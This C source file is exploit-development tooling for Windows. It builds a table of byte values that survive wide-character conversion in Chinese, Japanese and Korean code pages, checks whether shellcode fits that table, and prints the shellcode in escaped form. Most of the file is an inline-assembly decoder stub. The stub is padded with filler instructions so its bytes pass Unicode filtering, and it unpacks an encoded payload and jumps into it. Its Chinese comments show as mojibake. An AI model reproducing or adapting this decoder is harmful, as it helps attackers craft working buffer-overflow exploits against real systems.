/* widechar.c
*
*  ��������͸��������ʾ����
*  ���ߣ�san, alert7, eyas, watercloud
*
*  ���Խ�������Ƿ������Ӧwidechar��Χ�ĳ���
*/

#include <windows.h>
#include <stdio.h>

#define CODE_CN		936// ANSI/OEM - Simplified Chinese (PRC, Singapore)
#define CODE_TW		950// ANSI/OEM - Traditional Chinese (Taiwan; Hong Kong SAR, PRC)
#define CODE_JP		932// ANSI/OEM - Japanese, Shift-JIS
#define CODE_Korean	949// ANSI/OEM - Korean (Unified Hangeul Code)
int		g_iCodePageList[]={936,950,932,949};
//���Ϊ�Ϸ���wide char��Χ�����byteֵΪ1������Ϊ0
char	*g_szWideCharShort;

void checkcode(unsigned char *shellcode,int iLen);
void printsc(unsigned char *sc, int len);
BOOL MakeWideCharList();
void SaveToFile();
void  shellcodefnlock();

#define  FNENDLONG   0x08

void main()
{
	char *fnendstr="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	unsigned	char	temp;
	unsigned	char	*shellcodefnadd;
	unsigned	char	shellcode[512];
	int			len,k;
	
	/* ��λ��shellcodefnlock�Ļ����롡*/
	shellcodefnadd=shellcodefnlock;
	temp=*shellcodefnadd;
	if(temp==0xe9) 
	{
		  ++shellcodefnadd;
		  k=*(int *)shellcodefnadd;
		  shellcodefnadd+=k;
		  shellcodefnadd+=4;
	}
	for(k=0;k<=0x500;++k)
		 if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) 
			 break;
	/* shellcodefnadd+k+8�ǵõ���shellcodefnlock�������ַ */
	len = 2*wcslen(shellcodefnadd+k+8);
	memcpy(shellcode,shellcodefnadd+k+8,len);

	if(!MakeWideCharList()) return;
	//SaveToFile();
	/*���shellcode�Ƿ��ںϷ���wide char��Χ*/
	checkcode(shellcode, len);
	//printsc(shellcode, len);
}

BOOL MakeWideCharList()
{
	unsigned char wbuff[4];
	unsigned char wbuff2[4];
	unsigned char buff[4];
	int		 i,j,ret,k;

	g_szWideCharShort = (char *)malloc(65536);
	memset(g_szWideCharShort, 1 , 65536);

	for(k=0;k<sizeof(g_iCodePageList)/sizeof(int);k++)//for 1
	{
		printf("UseCodePage=%d\n",g_iCodePageList[k]);
		for(i=0;i<256;i++)//for 2
		{
			for(j=0;j<256;j++)//for 3
			{
				if((i==0) && (j==0)) j=1;
				memset(buff, 0, 4);
				memset(wbuff2, 0, 4);
				wbuff[0]=(BYTE)i;
				wbuff[1]=(BYTE)j;
				wbuff[2]=(BYTE)'\0';
				wbuff[3]=(BYTE)'\0';
 				if(!(ret = WideCharToMultiByte(g_iCodePageList[k], 0, 
(unsigned short *)wbuff, 1, buff, 2, 0,0)))		
				{
					printf("WideCharToMultiByte error:%d\n", 
GetLastError());
					return FALSE;
				}
				if(!(ret = MultiByteToWideChar(g_iCodePageList[k], 0, 
buff,strlen(buff), (unsigned short *)wbuff2, 1)))
				{
					printf("MultiByteToWideChar error:%d %d\n", 
GetLastError(), ret);
					return FALSE;
				}
				//�жϾ�������ת�����Ƿ�ı䣬ֻҪ���κ�һ��code 
page�ı䶼��Ϊ�Ƿ�wide char��Χ
				if(*(DWORD *)wbuff != *(DWORD *)wbuff2)
					g_szWideCharShort[(BYTE)wbuff[0]*0x100 + 
(BYTE)wbuff[1]] = (BYTE)'\0';
			}
			//getchar();
		}//end of for 2
	}//end of for 1
	return TRUE;
}

void SaveToFile()
{
	unsigned char	*g_pStr;
	FILE	*f;
	int		i,j,k;

	i=0;
	/*�������wide char��Χ�������ı��ļ������ڵ���ʱ��ѯ*/
	g_pStr = (unsigned char *)malloc(65536*6 +200);
	memset(g_pStr, 0, 65536*6+200);
	for(k=0;k<sizeof(g_iCodePageList)/sizeof(int);k++)//for 1
		i += sprintf(g_pStr+i, "UseCodePage=%d\n",g_iCodePageList[k]);
	for(j=0;j<65536;j++)
		if(g_szWideCharShort[j] != (BYTE)'\0')
			i += sprintf(g_pStr+i, "%.4X\n", j);
	f = fopen("c:\\w.txt", "w");
	fprintf(f, "%s", g_pStr);
	fclose(f);
	free(g_pStr);
}

void printsc(unsigned char *sc, int len)
{
	int	l;
	for(l=0;l<len;l+=1)
	{
		if(l==0) printf("\"");
		if((l%16 == 0) && (l!=0))printf("\"\n\"");
		printf("\\x%.2X", sc[l]);
		if(l==len-1) printf("\"");
	}
	printf("\n\n");
	for(l=0;l<len;l+=2)
	{
		if(l==0) printf("\"");
		if((l%16 == 0) && (l!=0))printf("\"\n\"");
		printf("%%u%.2X%.2X", sc[l+1], sc[l]);
		if(l==len-2) printf("\"");
	}
}

void checkcode(unsigned char *sc,int len)
{
	int	l;
	/*���*/
	printf("\nstart check shellcode\n");
	for(l=0;l<len;l+=2)
	{
		printf("shellcode %.2X%.2X at sc[%.2d] sc[%.2d] ",
			sc[l], sc[l+1], l, l+1);
		if(g_szWideCharShort[(BYTE)sc[l]*0x100 + (BYTE)sc[l+1]] == (BYTE)'\0')
			printf("not ");
		printf("allow.\n");
	}
	printf("Done.\n");
}

/*ע��:Ϊ�˷���wide char��Χ��NOPCODE��DATABASE��yuange�Ĳ�һ��*/
/*��Ӧ��shellcode���б���ʱҪע���Դ�Ϊ׼*/
#define  NOPCODE       0x4f//dec esi 0x4f='O' 0x4E='N'
#define  OFFSETNUM     0x8
#define  DATABASE      0x64
void  shellcodefnlock()
{
    _asm
	{
     nop
     nop
     nop
     nop
     nop
     nop
     nop
     nop

/*start here*/

	 dec	edi//���ô��룬ΪǨ��ָ�Χ 4f
	 jnz	unlockdataw//75 05
	 jz		unlockdataw//74 03
	 dec	esi//���ô��룬ΪǨ��ָ�Χ 4e <--��Զ����ִ�е���

	 /*��toshell����ǰ����Ϊ�˷��������ԣ�����һ��һ���������*/
	 /*��Ȼjz toshell��ʱ�������������ת�����Һ����ƫ��ûȷ���Ļ����ͺ��ѵ�׼*/
	 /*����wide char��Χ�Ĵ�����*/
toshell:   
	 /*��ʱesp��ŵ��ǽ�����shellcode��ʼ��ַ��Ҳ������ǰshellcode����ʼ��ַ*/
     ret//c3
	 dec	edi//���ô��룬ΪǨ��ָ�Χ 4f <--��Զ����ִ�е���

unlockdataw:
	/*ȡ�����ǵ�decoder����ʼ��ַ*/
     push  ebx//53
	/*����ͨ�� push esp  */
	/*��ַ������esi*/
	 NOP
     pop   esi//5e

/*��λ�����￪ʼ����*/
loopload: 
	 /*��ȡ�����ֽ����ݣ���esiΪ����*/
     lodsw//66 ad
	 dec	esi//���ô��룬ΪǨ��ָ�Χ 4e
	 inc	esi//���ô��룬ΪǨ��ָ�Χ 46
	 dec	edi//���ô��룬ΪǨ��ָ�Χ 4f

	 inc	ebx//���ô��룬ΪǨ��ָ�Χ 43
	/*�ж��Ƿ��Ѿ��ﵽ��������ַ���*/
     cmp  ax,0x6F97 // SHELLDATA 66 3d 97 6F	|
	 NOP//���ô��룬ΪǨ��ָ�Χ 90		|
	 push	ecx//���ô��룬ΪǨ��ָ�Χ 51	|
	 NOP//���ô��룬ΪǨ��ָ�Χ 90		|------>��߲�����Ӱ���־λ��ָ��
	 pop	ecx//���ô��룬ΪǨ��ָ�Χ 59	|
     jnz  loopload//75 F0			|
	 push	ebx//���ô��룬ΪǨ��ָ�Χ 53

	
	 /*���������ַ�����ʼ��ַ������edi���������ַ�Ҳ�Ӵ���ʼ��ַ���*/
     push esi//56
     pop  edi//5f
	 dec	edx//���ô��룬ΪǨ��ָ�Χ 4a	 
	 /*������ʼ��ַ��ע�����push pop����Ҫ����*/
	 /*��Ȼtoshell�е�retָ��Ͳ��ܷ��ص�������shellcode��*/
	 push	edi//57 
	 inc	ebx//���ô��룬ΪǨ��ָ�Χ 43

/*��ʼ����*/
looplock:    
	 /*��ȡ�����ֽ����ݣ���esiΪ����*/
	 lodsw//66 ad
	 push	eax//���ô��룬ΪǨ��ָ�Χ 50  -------<<3>>
	 inc	ebx//���ô��룬ΪǨ��ָ�Χ 43
	 /*�ж��Ƿ��Ѿ�ȫ���������*/
     cmp  ax,NOPCODE// 66 3d 4f 00
	 NOP
	 pop	ecx//���ô��룬ΪǨ��ָ�Χ 59 --------<<3>>��ԭ��ջ����
     jz   toshell//74 d5

	 dec	esi//���ô��룬ΪǨ��ָ�Χ 4e   ------<<1>>
	 /*����*/
     sub  al,DATABASE//2c 64
	 /*������ecx*/
	 push	eax//50
	 pop	ecx//59
	 inc	esi//���ô��룬ΪǨ��ָ�Χ 46  -------<<1>>��ԭesiֵ
	 dec	edi//���ô��룬ΪǨ��ָ�Χ 4f  -------<<2>>
	 inc	edi//���ô��룬ΪǨ��ָ�Χ 47  -------<<2>>
	 NOP	   //���ô��룬ΪǨ��ָ�Χ 90

	 inc	ebx//���ô��룬ΪǨ��ָ�Χ 43
	 /*��ȡ�����ֽڣ���esiΪ����*/
     lodsw//66 AD
	 push	eax//���ô��룬ΪǨ��ָ�Χ 50   -------<<4>>
	 dec	ebx//���ô��룬ΪǨ��ָ�Χ 4b
	 pop	eax//���ô��룬ΪǨ��ָ�Χ 58   -------<<4>>
	 /*����*/
     sub  al,DATABASE//2c 64

	 /*--------------��Ͻ���������--------------------*/
	 dec	edx//���ô��룬ΪǨ��ָ�Χ 4a
	 push	edi//57 ����edi����Ϊ����Ҫ�õ�              ----->>[1]
	 /*��ecxֵת�Ƶ�edi*/
	 push	ecx//51
	 NOP//���ô��룬ΪǨ��ָ�Χ 90
	 NOP//���ô��룬ΪǨ��ָ�Χ 90
	 pop	edi//5f
	 /* edi*0x10 */
	 add	edi,edi//03 ff
	 add	edi,edi
	 add	edi,edi
	 add	edi,edi
	 /*���ڶ�λ����Ľ��(eax) + ��һλ(edi*0x10)������õ������*/
	 xchg	eax,ecx//91
	 add	ecx,edi//03 cf
	 xchg	eax,ecx//91

	 /*�ָ�ediֵ*/
	 NOP//���ô��룬ΪǨ��ָ�Χ 90
	 pop	edi//5f           -------->>[1]
	 /*�����������ݱ��棬��ediΪ����*/
     stosb//aa
	 NOP//���ô��룬ΪǨ��ָ�Χ 90

	 inc	ecx//���ô��룬ΪǨ��ָ�Χ 41
     jz  looplock//74 ca			|
	 NOP//���ô��룬ΪǨ��ָ�Χ 90		|
	 push	ecx//���ô��룬ΪǨ��ָ�Χ 51	|--->�����û�Ӱ���־λ��ָ��
	 NOP//90				|
	 pop	ecx//���ô��룬ΪǨ��ָ�Χ 59	|
     jnz looplock//75 c4
	 dec	esi//���ô��룬ΪǨ��ָ�Χ 4e �������Զ����ִ��
	 /*�������������*/
     _emit(0x97)
     _emit(0x6F)
	 /**/
     _emit(0x0)
     _emit(0x0)
     _emit(0x0)
     _emit(0x0)
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     
	}
}
